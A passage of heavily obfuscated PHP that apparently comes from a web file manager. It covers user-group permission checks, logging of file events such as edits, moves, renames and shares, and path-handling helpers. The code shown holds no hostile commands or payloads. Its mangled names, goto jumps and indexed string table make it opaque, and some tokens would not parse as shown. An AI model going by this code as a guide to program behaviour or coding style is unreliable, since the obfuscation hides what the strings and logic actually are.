$dÅöš¬Ğ•«)) { $C®‡¯ä‡öš = !0; $bŞÍµ„©‰Ï = $this->groupStepToUserGroup($EÉš¢Í˜’Ò, $dÅöš¬Ğ•«); if ($bŞÍµ„©‰Ï < $fï¨¬ˆŒëÍ) { $fï¨¬ˆŒëÍ = $bŞÍµ„©‰Ï; $Aà¸Ñ³Š²† = $AË‹±²ò”; $D¤–’˜ŠÉ = $d§È†º‘ï; $BÌ¨›ŞÚ½² = $EÉš¢Í˜’Ò; } if ($bŞÍµ„©‰Ï == $fï¨¬ˆŒëÍ && $AË‹±²ò” >= $Aà¸Ñ³Š²†) { $Aà¸Ñ³Š²† = $AË‹±²ò”; $D¤–’˜ŠÉ = $d§È†º‘ï; $BÌ¨›ŞÚ½² = $EÉš¢Í˜’Ò; } } else { if ($EÉš¢Í˜’Ò == $bÔšÏà–[491]) { $cÓ¹šŞ´«Ö = !0; $CëÆŞ£ºÃ  = $d§È†º‘ï; $f°Ï£Ğœš¹ = $AË‹±²ò”; } } } } if ($AÂêœÊß¬±) { $Dš¸‰ì”õØ = $C›Ç÷¹°‰; $d§È†º‘ï = $D±ÁêëÅÈ¹; $D“Š‰¬äÔù = LNG($bÔšÏà–[1868]); } else { if ($C®‡¯ä‡öš) { $Dš¸‰ì”õØ = $Aà¸Ñ³Š²†; $d§È†º‘ï = $D¤–’˜ŠÉ; $d¤§× Ğà¥ = Model($bÔšÏà–[480])->getInfo($BÌ¨›ŞÚ½²); $D“Š‰¬äÔù = $bÔšÏà–[159] . $d¤§× Ğà¥[$bÔšÏà–[485]] . $bÔšÏà–[1869] . LNG($bÔšÏà–[1870]); } else { if ($cÓ¹šŞ´«Ö) { $Dš¸‰ì”õØ = $f°Ï£Ğœš¹; $d§È†º‘ï = $CëÆŞ£ºÃ ; $D“Š‰¬äÔù = LNG($bÔšÏà–[1841]); } else { $Dš¸‰ì”õØ = 0; $d§È†º‘ï = !1; $D“Š‰¬äÔù = $bÔšÏà–[33]; } } } $DÏ²òÖ·Šå = array($bÔšÏà–[1860] => intval($Dš¸‰ì”õØ), $bÔšÏà–[1844] => $d§È†º‘ï, $bÔšÏà–[1861] => $D“Š‰¬äÔù, $bÔšÏà–[1853] => $F„ù“ìë¨·[$bÔšÏà–[390]]); goto C‚É¡Á²ï¥; D‡ÏŠ´†Ÿ¸: } private function groupContainUser($D™’Ö›»ƒ¿, $C‰¥¦ÆìÊÕ = false) { return in_array($D™’Ö›»ƒ¿, $this->userGroupParents($C‰¥¦ÆìÊÕ)); } private function groupStepToUserGroup($c´‡–âİ¤, $B¡êªÃÓÖŠ = false) { goto D›¼¢ÄÕ; eÇŠ¸ÖÑ¤: $FåÌ‡ììªâ = $GLOBALS[$a•¶“ÒÅßñ[6]][$a•¶“ÒÅßñ[87]][$a•¶“ÒÅßñ[1760]] == 1; $FàÅÎ¤ó§æ = $FåÌ‡ììªâ ? 3 : 2; foreach ($d²¤øô“˜õ as $d¿ê¬³ö‚) { if ($d¿ê¬³ö‚[$a•¶“ÒÅßñ[1667]] == $c´‡–âİ¤) { return 0; } $c¶„çˆâÁ = explode($a•¶“ÒÅßñ[47], trim($d¿ê¬³ö‚[$a•¶“ÒÅßñ[481]], $a•¶“ÒÅßñ[47])); if ($c¶„çˆâÁ[0] == $a•¶“ÒÅßñ[491] && count($c¶„çˆâÁ) > $FàÅÎ¤ó§æ) { $a»’«çŸŞ› = array_reverse(array_slice($c¶„çˆâÁ, $FàÅÎ¤ó§æ)); $c–ğÑ’à ò = array_search($c´‡–âİ¤, $a»’«çŸŞ›); if ($c–ğÑ’à ò !== !1 && $c–ğÑ’à ò + 1 <= $DÄîˆê®¾) { $DÄîˆê®¾ = $c–ğÑ’à ò + 1; } } } goto EæìâğŸù; EæìâğŸù: return $DÄîˆê®¾; goto dà¯ñÄÛ®ƒ; D›¼¢ÄÕ: $a•¶“ÒÅßñ =& $_SERVER[¹…ÕÄ]; $d²¤øô“˜õ = $this->userGroupList($B¡êªÃÓÖŠ); $DÄîˆê®¾ = 1000; goto eÇŠ¸ÖÑ¤; dà¯ñÄÛ®ƒ: } private function userGroupList($dˆ¶ÚŒĞ‡ = false) { $Cê…Ò÷‘ğ¦ =& $_SERVER[¹…ÕÄ]; static $B‡©ò¼†¬˜ = array(); if (isset($B‡©ò¼†¬˜[$dˆ¶ÚŒĞ‡])) { return $B‡©ò¼†¬˜[$dˆ¶ÚŒĞ‡]; } $fÚ¯ãšÎ•÷ = Model($Cê…Ò÷‘ğ¦[501])->getInfo($dˆ¶ÚŒĞ‡); $B‡©ò¼†¬˜[$dˆ¶ÚŒĞ‡] = array_to_keyvalue($fÚ¯ãšÎ•÷[$Cê…Ò÷‘ğ¦[1842]], $Cê…Ò÷‘ğ¦[1667]); return $B‡©ò¼†¬˜[$dˆ¶ÚŒĞ‡]; } public function userGroupParents($Bë ¨×ï¶Ó) { goto eÎ˜®º„¡ç; eÎ˜®º„¡ç: $D×à–‡ÕØˆ =& $_SERVER[¹…ÕÄ]; static $a¦ºÛØ¹© = array(); $Bë ¨×ï¶Ó = $Bë ¨×ï¶Ó ? $Bë ¨×ï¶Ó : USER_ID; goto E£½Ş·—Ìø; Dè½¤©ñ: $b›¬£½áÄÎ = $GLOBALS[$D×à–‡ÕØˆ[6]][$D×à–‡ÕØˆ[87]][$D×à–‡ÕØˆ[1760]] == 1; $fçäÂÎ“¼ç = $b›¬£½áÄÎ ? 3 : 2; foreach ($aš–ÇàòÕ as $Aõø«‘½˜) { $aµºøÑÉÛ = array($Aõø«‘½˜[$D×à–‡ÕØˆ[1667]]); $aÓƒ•”ªŒ = explode($D×à–‡ÕØˆ[47], trim($Aõø«‘½˜[$D×à–‡ÕØˆ[481]], $D×à–‡ÕØˆ[47])); if ($aÓƒ•”ªŒ[0] == $D×à–‡ÕØˆ[491] && count($aÓƒ•”ªŒ) > $fçäÂÎ“¼ç) { $D·ÙÖË¼¢£ = array_slice($aÓƒ•”ªŒ, $fçäÂÎ“¼ç); $aµºøÑÉÛ = array_merge($aµºøÑÉÛ, array_reverse($D·ÙÖË¼¢£)); } $DØÖ¿¦‹ä = array_merge($DØÖ¿¦‹ä, $aµºøÑÉÛ); } goto DÂ‡µ×Šíà; E£½Ş·—Ìø: if (isset($a¦ºÛØ¹©[$Bë ¨×ï¶Ó])) { return $a¦ºÛØ¹©[$Bë ¨×ï¶Ó]; } $aš–ÇàòÕ = $this->userGroupList($Bë ¨×ï¶Ó); $DØÖ¿¦‹ä = array(); goto Dè½¤©ñ; DÂ‡µ×Šíà: $a¦ºÛØ¹©[$Bë ¨×ï¶Ó] = array_unique($DØÖ¿¦‹ä); return $a¦ºÛØ¹©[$Bë ¨×ï¶Ó]; goto b‡Ò¡éİš; b‡Ò¡éİš: } public function authTargetInfoMake($AïÌòÆÎš) { goto a¹ÊÃâ°àÑ; a¹ÊÃâ°àÑ: $e”¦´Œâã› =& $_SERVER[¹…ÕÄ]; $d‹Â¢¤±­© = array(); $dŞ­èïÃ‰ = array(); goto dÔ†ª·‡£; AŒÜ¯ïô„Í: return array($e”¦´Œâã›[1872] => $d‹Â¢¤±­©, $e”¦´Œâã›[1873] => $dŞ­èïÃ‰); goto f¬Âëá˜í; dÔ†ª·‡£: foreach ($AïÌòÆÎš as $cóÉšŸŞ¹¶) { if ($cóÉšŸŞ¹¶[$e”¦´Œâã›[398]] == SourceModel::TYPE_USER) { $d‹Â¢¤±­©[] = intval($cóÉšŸŞ¹¶[$e”¦´Œâã›[478]]); } else { if ($cóÉšŸŞ¹¶[$e”¦´Œâã›[398]] == SourceModel::TYPE_GROUP) { $dŞ­èïÃ‰[] = intval($cóÉšŸŞ¹¶[$e”¦´Œâã›[478]]); } } } if ($d‹Â¢¤±­©) { $d‹Â¢¤±­© = Model($e”¦´Œâã›[497])->userListInfo($d‹Â¢¤±­©); } if ($dŞ­èïÃ‰) { $dĞ‰ŠŞ´â = array($e”¦´Œâã›[1746] => array($e”¦´Œâã›[405], $dŞ­èïÃ‰)); $dŞ­èïÃ‰ = Model($e”¦´Œâã›[480])->field($e”¦´Œâã›[1871])->where($dĞ‰ŠŞ´â)->select(); $dŞ­èïÃ‰ = array_to_keyvalue($dŞ­èïÃ‰, $e”¦´Œâã›[1667]); } goto AŒÜ¯ïô„Í; f¬Âëá˜í: } public function authInfo($DÜê·œ›îà) { $Aøğ˜à¥Ê =& $_SERVER[¹…ÕÄ]; if ($DÜê·œ›îà[$Aøğ˜à¥Ê[1763]]) { $eŒæëº›Ó = Model($Aøğ˜à¥Ê[1835])->listData($DÜê·œ›îà[$Aøğ˜à¥Ê[1763]]); if (!$eŒæëº›Ó) { return !1; $c¢ÔÁ”œæÆ = Model($Aøğ˜à¥Ê[1835])->listData(); $bìˆ´ÒÒ = array_filter_by_field($c¢ÔÁ”œæÆ, $Aøğ˜à¥Ê[400], $Aøğ˜à¥Ê[491]); return $bìˆ´ÒÒ; } $a‹ˆ„Çèù• = array_field_key($eŒæëº›Ó, array($Aøğ˜à¥Ê[388], $Aøğ˜à¥Ê[28], $Aøğ˜à¥Ê[400], $Aøğ˜à¥Ê[1688], $Aøğ˜à¥Ê[1690])); $a‹ˆ„Çèù•[$Aøğ˜à¥Ê[1874]] = $DÜê·œ›îà; return $a‹ˆ„Çèù•; } else { return array($Aøğ˜à¥Ê[406] => 0, $Aøğ˜à¥Ê[1673] => $DÜê·œ›îà[$Aøğ˜à¥Ê[1817]], $Aøğ˜à¥Ê[407] => $Aøğ˜à¥Ê[33], $Aøğ˜à¥Ê[1688] => $Aøğ˜à¥Ê[1875]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\162\x63\145\137\145\x76\x65\156\x74"; protected $dataAuto = array(array("\143\x72\145\141\164\145\x54\x69\155\145", "\164\x69\x6d\x65", "\x69\x6e\163\145\x72\164", "\146\x75\156\143\x74\151\x6f\x6e"), array("\x64\145\x73\x63", '', "\x69\x6e\x73\145\162\164\x2c\165\160\x64\141\x74\145\54\163\x65\x6c\x65\143\x74", "\x6a\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($aİ„ğ‡æÁˆ, $A¸ÉËèÉÊ‰, $BÇ”ï‚ê½Ù = '') { goto f¢½º²ÑÖÔ; FÕÈ»˜ßí°: if (!$b–êëÒÓë) { return !1; } if ($this->isCacheEvent($b–êëÒÓë, $A¸ÉËèÉÊ‰)) { return; } if ($BÇ”ï‚ê½Ù && is_string($BÇ”ï‚ê½Ù)) { $BÇ”ï‚ê½Ù = array($Bòêõªå´[1700] => $BÇ”ï‚ê½Ù); } goto CË¨·ğ©ö®; CË¨·ğ©ö®: $FïŠ‘Î¼ó½ = array($Bòêõªå´[404] => $aİ„ğ‡æÁˆ, $Bòêõªå´[1876] => $b–êëÒÓë[$Bòêõªå´[472]], $Bòêõªå´[1877] => $b–êëÒÓë[$Bòêõªå´[28]], $Bòêõªå´[489] => $b–êëÒÓë[$Bòêõªå´[489]], $Bòêõªå´[1496] => USER_ID, $Bòêõªå´[409] => $A¸ÉËèÉÊ‰, $Bòêõªå´[1498] => $BÇ”ï‚ê½Ù); $this->addSystemLog($A¸ÉËèÉÊ‰, $FïŠ‘Î¼ó½); return $this->add($FïŠ‘Î¼ó½); goto dÍÕœˆ§ç±; f¢½º²ÑÖÔ: $Bòêõªå´ =& $_SERVER[¹…ÕÄ]; if (!$this->eventSave) { return; } $b–êëÒÓë = Model($Bòêõªå´[1183])->sourceInfo($aİ„ğ‡æÁˆ); goto FÕÈ»˜ßí°; dÍÕœˆ§ç±: } private function addSystemLog($BÛ¢ç´ğì, $FÒÄ©Ù¥¢°) { $a»Ê°¤÷œº =& $_SERVER[¹…ÕÄ]; if ($BÛ¢ç´ğì == $a»Ê°¤÷œº[1878]) { $BÛ¢ç´ğì = $FÒÄ©Ù¥¢°[$a»Ê°¤÷œº[425]][$a»Ê°¤÷œº[1879]]; } else { if (in_array($BÛ¢ç´ğì, array($a»Ê°¤÷œº[1644], $a»Ê°¤÷œº[1880]))) { $BÛ¢ç´ğì = $FÒÄ©Ù¥¢°[$a»Ê°¤÷œº[425]][$a»Ê°¤÷œº[708]]; } } $d„ÜÏµâØ = array_merge($FÒÄ©Ù¥¢°, array($a»Ê°¤÷œº[1881] => $FÒÄ©Ù¥¢°[$a»Ê°¤÷œº[390]], $a»Ê°¤÷œº[1882] => $FÒÄ©Ù¥¢°[$a»Ê°¤÷œº[1882]])); Model($a»Ê°¤÷œº[1608])->addLog($a»Ê°¤÷œº[1883] . $BÛ¢ç´ğì, $d„ÜÏµâØ); } private function isCacheEvent($F¯’†‘å§ª, $f˜‚ê”Ã¾Î) { if ($F¯’†‘å§ª[$_SERVER[¹…ÕÄ][398]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($BãˆÆĞÔ, $aŠ·÷è’Î™) { $Aç‘Í’Çİ =& $_SERVER[¹…ÕÄ]; $F“•¶‘ ÉÂ = Model($Aç‘Í’Çİ[1183])->sourceInfo($BãˆÆĞÔ); $dÖ„Ñ—‰ƒÂ = array($Aç‘Í’Çİ[1879] => $aŠ·÷è’Î™, $Aç‘Í’Çİ[28] => $F“•¶‘ ÉÂ[$Aç‘Í’Çİ[28]]); return $this->addEvent($BãˆÆĞÔ, $Aç‘Í’Çİ[1878], $dÖ„Ñ—‰ƒÂ); } public function eventFileEdit($DÏ‘Ğ¡¥é¨) { $aã°ËÁ‰ãö =& $_SERVER[¹…ÕÄ]; $d°ò’Ğ·ö = array($aã°ËÁ‰ãö[1884] => $_SERVER[$aã°ËÁ‰ãö[1885]], $aã°ËÁ‰ãö[1886] => strtolower(ACTION)); return $this->addEvent($DÏ‘Ğ¡¥é¨, $aã°ËÁ‰ãö[1634], $d°ò’Ğ·ö); } public function eventRecycle($eİƒ®´–Áƒ, $dÛá©÷ÓÇ) { return $this->addEvent($eİƒ®´–Áƒ, $_SERVER[¹…ÕÄ][1880], $dÛá©÷ÓÇ); } public function eventRemove($c©î–Ğ¤Îö) { $e›ëŞŒŒî =& $_SERVER[¹…ÕÄ]; $C •¿¸Íœ‡ = Model($e›ëŞŒŒî[1183])->sourceInfo($c©î–Ğ¤Îö); $E¨ÂÌ÷¸šÌ = $C •¿¸Íœ‡[$e›ëŞŒŒî[28]]; return $this->addEvent($C •¿¸Íœ‡[$e›ëŞŒŒî[472]], $e›ëŞŒŒî[1633], $E¨ÂÌ÷¸šÌ); } public function eventShare($aãù²½¬ƒù, $C„ô•Ö§Â) { return $this->addEvent($aãù²½¬ƒù, $_SERVER[¹…ÕÄ][1644], $C„ô•Ö§Â); } public function eventMove($d’‰½¼—‘é, $d‰ÏÅöÍ¯Í, $eÃöŸ„ŞëÈ) { goto dÛ˜œ¨¾§; FÎ¶³ñ»Ü: $this->addEvent($d’‰½¼—‘é, $F“ÊïÈ¹“Ş[515], $f™Ê¥Ò†§Õ); $E¿Ñá®—ö’ = $ağÅùÍù»->sourceInfo($d’‰½¼—‘é); $f™Ê¥Ò†§Õ = array($F“ÊïÈ¹“Ş[390] => $E¿Ñá®—ö’[$F“ÊïÈ¹“Ş[390]], $F“ÊïÈ¹“Ş[28] => $E¿Ñá®—ö’[$F“ÊïÈ¹“Ş[28]]); goto f×ó„Ë¼â; f×ó„Ë¼â: $this->addEvent($d‰ÏÅöÍ¯Í, $F“ÊïÈ¹“Ş[1890], $f™Ê¥Ò†§Õ); goto dï‘Ÿœ²Œá; dÛ˜œ¨¾§: $F“ÊïÈ¹“Ş =& $_SERVER[¹…ÕÄ]; $ağÅùÍù» = Model($F“ÊïÈ¹“Ş[1183]); $E¿Ñá®—ö’ = $ağÅùÍù»->sourceInfo($d’‰½¼—‘é); goto DÃó—‹â­¼; DÃó—‹â­¼: $Eİ«‰è³ã­ = $ağÅùÍù»->sourceInfo($d‰ÏÅöÍ¯Í); $dÆË©‘ = $ağÅùÍù»->sourceInfo($eÃöŸ„ŞëÈ); $f™Ê¥Ò†§Õ = array($F“ÊïÈ¹“Ş[1033] => $d‰ÏÅöÍ¯Í, $F“ÊïÈ¹“Ş[1887] => $Eİ«‰è³ã­[$F“ÊïÈ¹“Ş[28]], $F“ÊïÈ¹“Ş[1867] => $Eİ«‰è³ã­[$F“ÊïÈ¹“Ş[489]], $F“ÊïÈ¹“Ş[1034] => $eÃöŸ„ŞëÈ, $F“ÊïÈ¹“Ş[1888] => $dÆË©‘[$F“ÊïÈ¹“Ş[28]], $F“ÊïÈ¹“Ş[1889] => $dÆË©‘[$F“ÊïÈ¹“Ş[489]]); goto FÎ¶³ñ»Ü; dï‘Ÿœ²Œá: } public function eventCopy($E®£„«â) { $this->eventCreate($E®£„«â, $_SERVER[¹…ÕÄ][513]); } public function eventRename($eºöäøÍØŒ, $BéöÆ‡ŒóË, $Dô«àóà–¤) { $d÷ÙÜ¶Šø© =& $_SERVER[¹…ÕÄ]; $FùÒ‘‰â•ß = array($d÷ÙÜ¶Šø©[1033] => $BéöÆ‡ŒóË, $d÷ÙÜ¶Šø©[1034] => $Dô«àóà–¤); return $this->addEvent($eºöäøÍØŒ, $d÷ÙÜ¶Šø©[1196], $FùÒ‘‰â•ß); } public function eventAddComment($d­éˆÔ…—ù, $då¤¾‡¶¡) { return $this->addEvent($d­éˆÔ…—ù, $_SERVER[¹…ÕÄ][1891], $då¤¾‡¶¡); } public function eventAddDesc($dÜœõ™°, $Bé¨ÀÒö–) { return $this->addEvent($dÜœõ™°, $_SERVER[¹…ÕÄ][1892], $Bé¨ÀÒö–); } public function listBySource($FŠ†„ÒŠ) { goto bÁèŸšéÌ¼; AŠºì˜›Òï: if ($aÇŠ¾©ùÏÂ[$F¿Ù¡ÄøŞ‹[397]] == $F¿Ù¡ÄøŞ‹[86]) { $Bâ®Ú•ìğØ = Model($F¿Ù¡ÄøŞ‹[1183])->listSearchChildren($FŠ†„ÒŠ, 20000); $Bâ®Ú•ìğØ[] = $FŠ†„ÒŠ . $F¿Ù¡ÄøŞ‹[373]; $B„ÅŒ£•ô¤ = array($F¿Ù¡ÄøŞ‹[390] => array($F¿Ù¡ÄøŞ‹[7], $Bâ®Ú•ìğØ)); } $DØ“ÃÓÚ³Ã = $this->where($B„ÅŒ£•ô¤)->order($F¿Ù¡ÄøŞ‹[1893])->selectPage(); if ($DØ“ÃÓÚ³Ã[$F¿Ù¡ÄøŞ‹[362]][$F¿Ù¡ÄøŞ‹[363]] == 0) { $DØ“ÃÓÚ³Ã[$F¿Ù¡ÄøŞ‹[362]][$F¿Ù¡ÄøŞ‹[363]] = 1; $DØ“ÃÓÚ³Ã[$F¿Ù¡ÄøŞ‹[365]] = array(array($F¿Ù¡ÄøŞ‹[404] => $FŠ†„ÒŠ, $F¿Ù¡ÄøŞ‹[1876] => $aÇŠ¾©ùÏÂ[$F¿Ù¡ÄøŞ‹[472]], $F¿Ù¡ÄøŞ‹[1496] => $aÇŠ¾©ùÏÂ[$F¿Ù¡ÄøŞ‹[426]], $F¿Ù¡ÄøŞ‹[409] => $F¿Ù¡ÄøŞ‹[1894], $F¿Ù¡ÄøŞ‹[410] => $aÇŠ¾©ùÏÂ[$F¿Ù¡ÄøŞ‹[192]], $F¿Ù¡ÄøŞ‹[1498] => $F¿Ù¡ÄøŞ‹[33])); } goto eåÙÜ¡¿²; eåÙÜ¡¿²: return $this->eventListParse($DØ“ÃÓÚ³Ã, $FŠ†„ÒŠ); goto A°çºÏÉ¢Ö; bÁèŸšéÌ¼: $F¿Ù¡ÄøŞ‹ =& $_SERVER[¹…ÕÄ]; $aÇŠ¾©ùÏÂ = Model($F¿Ù¡ÄøŞ‹[1183])->sourceInfo($FŠ†„ÒŠ); $B„ÅŒ£•ô¤ = array($F¿Ù¡ÄøŞ‹[404] => $FŠ†„ÒŠ); goto AŠºì˜›Òï; A°çºÏÉ¢Ö: } private function eventListParse($e­ƒÏÎù·, $FÑ—œ¥¥ ) { goto dš¤ÌÂµ•Ã; A ¼áÃ÷«ê: $AÖã„Š† — = array_unique($AÖã„Š† —); $aóàƒÇÖ = array_unique(array_to_keyvalue($A³Ù¶µÄ²Ó, $CÚ©ò»‹¥[33], $CÚ©ò»‹¥[1504])); $D‰º‰Çª«¹ = Model($CÚ©ò»‹¥[501])->userListInfo($aóàƒÇÖ); goto DŒØŞ±‚ã; DŒØŞ±‚ã: $dŞ„Á®„—– = Model($CÚ©ò»‹¥[770])->sourceListInfo($AÖã„Š† —, !0); foreach ($A³Ù¶µÄ²Ó as &$B‰——²ÂÜÕ) { if ($B‰——²ÂÜÕ[$CÚ©ò»‹¥[29]] == $CÚ©ò»‹¥[515] && isset($B‰——²ÂÜÕ[$CÚ©ò»‹¥[425]][$CÚ©ò»‹¥[1033]])) { $B‰——²ÂÜÕ[$CÚ©ò»‹¥[425]][$CÚ©ò»‹¥[1033]] = $dŞ„Á®„—–[$B‰——²ÂÜÕ[$CÚ©ò»‹¥[425]][$CÚ©ò»‹¥[1033]]]; $B‰——²ÂÜÕ[$CÚ©ò»‹¥[425]][$CÚ©ò»‹¥[1034]] = $dŞ„Á®„—–[$B‰——²ÂÜÕ[$CÚ©ò»‹¥[425]][$CÚ©ò»‹¥[1034]]]; } if ($B‰——²ÂÜÕ[$CÚ©ò»‹¥[29]] == $CÚ©ò»‹¥[1890] && isset($B‰——²ÂÜÕ[$CÚ©ò»‹¥[425]][$CÚ©ò»‹¥[390]])) { $B‰——²ÂÜÕ[$CÚ©ò»‹¥[425]][$CÚ©ò»‹¥[390]] = $dŞ„Á®„—–[$B‰——²ÂÜÕ[$CÚ©ò»‹¥[425]][$CÚ©ò»‹¥[390]]]; } $B‰——²ÂÜÕ[$CÚ©ò»‹¥[84]] = $dŞ„Á®„—–[$B‰——²ÂÜÕ[$CÚ©ò»‹¥[390]]]; $B‰——²ÂÜÕ[$CÚ©ò»‹¥[1895]] = $dŞ„Á®„—–[$B‰——²ÂÜÕ[$CÚ©ò»‹¥[1882]]]; if ($B‰——²ÂÜÕ[$CÚ©ò»‹¥[29]] == $CÚ©ò»‹¥[1633]) { $B‰——²ÂÜÕ[$CÚ©ò»‹¥[1895]] = $B‰——²ÂÜÕ[$CÚ©ò»‹¥[84]]; $B‰——²ÂÜÕ[$CÚ©ò»‹¥[1882]] = $B‰——²ÂÜÕ[$CÚ©ò»‹¥[1895]][$CÚ©ò»‹¥[390]]; $B‰——²ÂÜÕ[$CÚ©ò»‹¥[84]] = !1; $B‰——²ÂÜÕ[$CÚ©ò»‹¥[390]] = $CÚ©ò»‹¥[33]; } $B‰——²ÂÜÕ[$CÚ©ò»‹¥[1825]] = $D‰º‰Çª«¹[$B‰——²ÂÜÕ[$CÚ©ò»‹¥[1504]]]; } unset($B‰——²ÂÜÕ); goto e±ÜàÛøØÊ; dš¤ÌÂµ•Ã: $CÚ©ò»‹¥ =& $_SERVER[¹…ÕÄ]; $A³Ù¶µÄ²Ó = $e­ƒÏÎù·[$CÚ©ò»‹¥[365]]; $AÖã„Š† — = array_to_keyvalue($A³Ù¶µÄ²Ó, $CÚ©ò»‹¥[33], $CÚ©ò»‹¥[390]); goto Dñº¤²‡œ„; e±ÜàÛøØÊ: $e­ƒÏÎù·[$CÚ©ò»‹¥[365]] = $A³Ù¶µÄ²Ó; return $e­ƒÏÎù·; goto föÉº¬‡‚ô; Dñº¤²‡œ„: $BéÖæ¨·è… = array_to_keyvalue($A³Ù¶µÄ²Ó, $CÚ©ò»‹¥[33], $CÚ©ò»‹¥[1882]); foreach ($A³Ù¶µÄ²Ó as $B‰——²ÂÜÕ) { $eê…İˆäÎ = $B‰——²ÂÜÕ[$CÚ©ò»‹¥[425]]; if ($B‰——²ÂÜÕ[$CÚ©ò»‹¥[29]] == $CÚ©ò»‹¥[515] && isset($eê…İˆäÎ[$CÚ©ò»‹¥[1033]])) { $AÖã„Š† —[] = $eê…İˆäÎ[$CÚ©ò»‹¥[1033]] . $CÚ©ò»‹¥[33]; $AÖã„Š† —[] = $eê…İˆäÎ[$CÚ©ò»‹¥[1034]] . $CÚ©ò»‹¥[33]; } if ($B‰——²ÂÜÕ[$CÚ©ò»‹¥[29]] == $CÚ©ò»‹¥[1890] && isset($eê…İˆäÎ[$CÚ©ò»‹¥[390]])) { $AÖã„Š† —[] = $eê…İˆäÎ[$CÚ©ò»‹¥[390]] . $CÚ©ò»‹¥[33]; } } $AÖã„Š† — = array_merge($AÖã„Š† —, $BéÖæ¨·è…, array($FÑ—œ¥¥  . $CÚ©ò»‹¥[33])); goto A ¼áÃ÷«ê; föÉº¬‡‚ô: } public function removeBySource($eâİÂÂô) { $F­ô¬¾ôÁÄ = array($_SERVER[¹…ÕÄ][404] => $eâİÂÂô); $this->where($F­ô¬¾ôÁÄ)->remove(); } } goto AÌ®¬­Ñ›’; E¥¡İÄ–: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $b¢ï¢ê¢ÜÊ =& $_SERVER[¹…ÕÄ]; $this->objectDriver = array($b¢ï¢ê¢ÜÊ[57], $b¢ï¢ê¢ÜÊ[58], $b¢ï¢ê¢ÜÊ[59], $b¢ï¢ê¢ÜÊ[60], $b¢ï¢ê¢ÜÊ[61], $b¢ï¢ê¢ÜÊ[62], $b¢ï¢ê¢ÜÊ[63], $b¢ï¢ê¢ÜÊ[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($b…‡–øƒñ‚) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($b…‡–øƒñ‚, $_SERVER[¹…ÕÄ][8]); } return $b…‡–øƒñ‚; } public function iconvApp($Fæ ÀæÈÑ) { return $Fæ ÀæÈÑ; } public function iconvSystem($AÅ¥”ƒËà÷) { return $AÅ¥”ƒËà÷; } public function iconvTo($Bó¸Çè•µ, $CÅÒíÃ·ÙÖ, $f£±İîŠØô) { goto B²ÓØŒÔË»; e–ó¯ñèø¥: $Eã«Üåº¼† = $Eã«Üåº¼† ? $Eã«Üåº¼† : $Bó¸Çè•µ; if (strstr($Eã«Üåº¼†, $A÷İÒœßà­[69])) { $Eã«Üåº¼† = str_replace($A÷İÒœßà­[69], $A÷İÒœßà­[70], $Eã«Üåº¼†); } $DÁõÓÚ©[$CÅÒíÃ·ÙÖ . $A÷İÒœßà­[66] . $f£±İîŠØô . $A÷İÒœßà­[67] . $Bó¸Çè•µ] = $Eã«Üåº¼†; goto E”ğÏ¦à•Ä; B²ÓØŒÔË»: $A÷İÒœßà­ =& $_SERVER[¹…ÕÄ]; if (!$Bó¸Çè•µ || !function_exists($A÷İÒœßà­[65])) { return $Bó¸Çè•µ; } static $DÁõÓÚ© = array(); goto D½ì™·Ü“Ÿ; bŒĞäÑ–ô‚: return $Eã«Üåº¼†; goto A«‹ÚÅàÄò; E”ğÏ¦à•Ä: $DÁõÓÚ©[$f£±İîŠØô . $A÷İÒœßà­[66] . $CÅÒíÃ·ÙÖ . $A÷İÒœßà­[67] . $Bó¸Çè•µ] = $Bó¸Çè•µ; $DÁõÓÚ©[$f£±İîŠØô . $A÷İÒœßà­[66] . $CÅÒíÃ·ÙÖ . $A÷İÒœßà­[67] . $Eã«Üåº¼†] = $Bó¸Çè•µ; $DÁõÓÚ©[$CÅÒíÃ·ÙÖ . $A÷İÒœßà­[66] . $f£±İîŠØô . $A÷İÒœßà­[67] . $Eã«Üåº¼†] = $Eã«Üåº¼†; goto bŒĞäÑ–ô‚; D½ì™·Ü“Ÿ: $E…¥ğÏŸ’Ù = $CÅÒíÃ·ÙÖ . $A÷İÒœßà­[66] . $f£±İîŠØô . $A÷İÒœßà­[67] . $Bó¸Çè•µ; if (isset($DÁõÓÚ©[$E…¥ğÏŸ’Ù])) { return $DÁõÓÚ©[$E…¥ğÏŸ’Ù]; } if (function_exists($A÷İÒœßà­[68])) { $Eã«Üåº¼† = @mb_convert_encoding($Bó¸Çè•µ, $f£±İîŠØô, $CÅÒíÃ·ÙÖ); } else { $Eã«Üåº¼† = @iconv($CÅÒíÃ·ÙÖ, $f£±İîŠØô, $Bó¸Çè•µ); } goto e–ó¯ñèø¥; A«‹ÚÅàÄò: } public function getPathInner($DÂ©‰¦†–) { $DÛôŠ›­¥› = IO::init($DÂ©‰¦†–); return $DÛôŠ›­¥›->path; } public function getPathOuter($dë»­º’óó) { $e¿ƒ•Ò´áİ =& $_SERVER[¹…ÕÄ]; $eèÙİ‡ï¿ = strlen(trim($this->pathBase, $e¿ƒ•Ò´áİ[8])); $dë»­º’óó = substr(trim($dë»­º’óó, $e¿ƒ•Ò´áİ[8]), $eèÙİ‡ï¿); return $this->pathDriver . $e¿ƒ•Ò´áİ[8] . ltrim($dë»­º’óó, $e¿ƒ•Ò´áİ[8]); } public function isParentOf($E½êøÎˆÕÙ, $a—­ö‰Î‘) { $fÊÅ­¿ö¥˜ =& $_SERVER[¹…ÕÄ]; $E½êøÎˆÕÙ = rtrim(strtolower($E½êøÎˆÕÙ), $fÊÅ­¿ö¥˜[8]) . $fÊÅ­¿ö¥˜[8]; $a—­ö‰Î‘ = rtrim(strtolower($a—­ö‰Î‘), $fÊÅ­¿ö¥˜[8]) . $fÊÅ­¿ö¥˜[8]; $f©š‰¾”¯¼ = strpos($a—­ö‰Î‘, $E½êøÎˆÕÙ) === 0; return $f©š‰¾”¯¼; } public function getType() { $aÒš¯ª¶ª =& $_SERVER[¹…ÕÄ]; $b„¨–à = str_replace($aÒš¯ª¶ª[71], $aÒš¯ª¶ª[33], get_class($this)); return strtolower($b„¨–à); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($D £ìì¨ù, $A˜’œÈ½£) { $E˜›‹°›Œó =& 